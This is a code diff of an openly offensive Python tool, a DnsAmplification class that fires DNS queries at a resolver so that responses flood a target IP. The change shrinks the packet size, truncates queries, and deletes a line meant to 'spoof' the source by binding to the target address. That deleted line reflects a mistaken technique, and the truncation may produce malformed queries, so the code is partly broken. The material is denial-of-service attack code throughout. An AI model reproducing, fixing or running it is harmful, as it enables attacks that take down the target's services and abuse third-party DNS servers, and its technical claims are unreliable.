@@ -9,7 +9,7 @@ from concurrent.futures import ThreadPoolExecutor
 init(autoreset=True)
 
 class DnsAmplification:
-    def __init__(self, target_ip, dns_server_ip, dns_server_port=53, num_threads=10, packet_size=1024):
+    def __init__(self, target_ip, dns_server_ip, dns_server_port=53, num_threads=10, packet_size=512):
         self.target_ip = target_ip
         self.dns_server_ip = dns_server_ip
         self.dns_server_port = dns_server_port
@@ -40,13 +40,12 @@ class DnsAmplification:
                 query += struct.pack("c", char.encode())
         query += struct.pack("BHH", 0, 1, 1)  # Type A, Class IN
 
-        return query
+        return query[:self.packet_size]  # Limit packet size
 
     def send_dns_query(self, domain):
         sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
         
         try:
-            sock.bind((self.target_ip, 0))  # Bind to target_ip to spoof IP address
             dns_query = self.create_dns_query(domain)
             sock.sendto(dns_query, (self.dns_server_ip, self.dns_server_port))
             logging.debug(Fore.GREEN + f"Sent DNS query for domain {domain} to {self.dns_server_ip}")
